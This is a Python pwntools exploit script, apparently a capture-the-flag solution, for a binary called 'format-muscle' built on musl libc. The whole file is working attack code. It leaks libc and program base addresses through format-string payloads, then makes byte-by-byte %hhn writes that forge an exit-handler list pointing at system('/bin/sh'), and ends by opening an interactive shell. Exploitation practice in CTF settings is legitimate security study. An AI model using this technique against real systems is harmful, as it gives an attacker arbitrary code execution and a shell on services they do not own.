#!/usr/bin/env python3

from pwn import context, ELF, p64, remote, sys, u64

context.binary = elf = ELF('format-muscle')
musl_libc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


def write_byte(byte: int, addr: int):
    assert 0 <= byte < 2 ** 8
    io.sendline(b'%c%c%c%c' + f'.%{byte + 248}c%c'.encode() + b'%c%c%hhn' + p64(addr))
    io.recv()


def write_qword(qword: int, addr: int):
    assert 0 <= qword < 2 ** 64
    for i in range(8):
        write_byte((qword >> (8 * i)) & 0xff, addr + i)


def main():
    io.sendline(b'%p')
    musl_libc.address = int(io.recv().decode(), 16) - 0xae1eb
    io.success(f'musl libc base address: {hex(musl_libc.address)}')

    elf_address_str = musl_libc.address + 0xaf561
    io.sendline(b'%p%p%p%p' + b'%p%p%p%s' + p64(elf_address_str))
    io.recvuntil(hex(u64(b'%p%p%p%s')).encode())
    elf.address = u64(b'\0' + io.recv(5) + b'\0' * 2)
    io.success(f'ELF base address: {hex(elf.address)}')
    io.recv()

    struct_fl_addr = musl_libc.address + 0xafc48
    fake_struct_fl_addr = elf.address + 0x4200

    write_qword(fake_struct_fl_addr, struct_fl_addr)
    write_qword(fake_struct_fl_addr, fake_struct_fl_addr)
    write_qword(musl_libc.sym.system, fake_struct_fl_addr + 0x100)
    write_qword(next(musl_libc.search(b'/bin/sh\0')), fake_struct_fl_addr + 0x200)

    io.sendline(b'quit')
    io.recvline()
    io.interactive()


if __name__ == '__main__':
    io = get_process()
    io.recv(timeout=1)
    main()
